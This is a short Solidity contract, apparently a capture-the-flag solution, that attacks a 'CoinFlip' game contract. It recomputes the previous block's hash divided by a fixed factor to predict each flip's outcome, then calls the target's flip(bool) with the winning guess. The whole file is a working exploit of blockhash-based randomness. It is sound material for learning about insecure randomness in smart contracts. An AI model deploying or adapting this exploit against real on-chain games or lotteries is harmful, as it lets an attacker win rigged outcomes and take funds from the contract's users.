// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/math/SafeMath.sol";

contract AttackCoinflip {
    using SafeMath for uint256;
    // Address of CoinFlip Smart Contract
    address coinFlipAddress;
    uint256 FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;

    function setAddress(address _coinFlipAddress) public {
        coinFlipAddress = _coinFlipAddress;
    }

    function attack() public {
        // Calculate blockvalue using blockhash and block number
        uint256 blockValue = uint256(blockhash(block.number.sub(1)));
        // Calculate coinFlip and then side.
        uint256 coinFlip = blockValue.div(FACTOR);
        bool side = coinFlip == 1 ? true : false;
        // Call flip() of CoinFlip Smart Contract
        (bool success, ) = coinFlipAddress.call(
            abi.encodeWithSignature("flip(bool)", side)
        );
        require(success, "Failed!");
    }
}
